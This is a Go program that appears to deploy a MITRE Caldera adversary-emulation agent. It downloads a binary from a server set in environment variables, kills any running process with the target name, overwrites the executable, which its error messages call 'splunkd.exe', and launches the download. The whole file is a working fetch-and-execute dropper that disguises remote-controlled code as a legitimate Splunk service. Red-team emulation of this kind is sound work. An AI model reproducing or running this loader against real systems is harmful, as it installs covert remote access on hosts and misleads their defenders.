package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"

	"github.com/bk-rim/script-golang-for-caldera/create-agent/util"
)

func main() {
	util.LoadEnv()
	server := os.Getenv("SERVER_URL")
	pathFile := os.Getenv("PATH_FILE")
	url := server + pathFile
	fileName := os.Getenv("FILE_NAME")
	pathExe := os.Getenv("EXE_PATH")
	osName := os.Getenv("OS_NAME")
	exeName := os.Getenv("EXE_NAME")

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("platform", osName)
	req.Header.Set("file", fileName)

	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		log.Fatal("Error status code:", res.StatusCode)
		return
	}

	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		panic(err)
	}

	processes, err := exec.Command("tasklist").Output()
	if err != nil {
		panic(err)
	}

	if util.BytesContains(processes, []byte(exeName)) {
		util.StopProcess(exeName)
	}

	err = os.Remove(pathExe)
	if err != nil && !os.IsNotExist(err) {
		log.Fatal("Error removing splunkd.exe:", err)
		return
	}

	err = ioutil.WriteFile(pathExe, data, 0644)
	if err != nil {
		log.Fatal("Error writing splunkd.exe:", err)
		return
	}

	cmd := exec.Command(pathExe)
	err = cmd.Start()
	if err != nil {
		panic(err)
	}

}
